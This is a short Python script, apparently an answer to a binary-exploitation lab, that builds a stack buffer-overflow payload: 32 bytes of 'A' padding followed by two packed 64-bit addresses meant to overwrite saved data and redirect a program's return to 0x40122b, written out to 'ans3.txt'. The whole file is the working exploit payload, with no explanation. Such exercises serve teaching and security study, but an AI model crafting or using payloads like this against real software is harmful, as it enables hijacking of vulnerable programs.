import struct
p=b'A'*32

f=struct.pack('<Q',0x403610)

target=struct.pack('<Q',0x40122b)

payload=p+f+target

with open("ans3.txt", "wb") as f:
    f.write(payload)
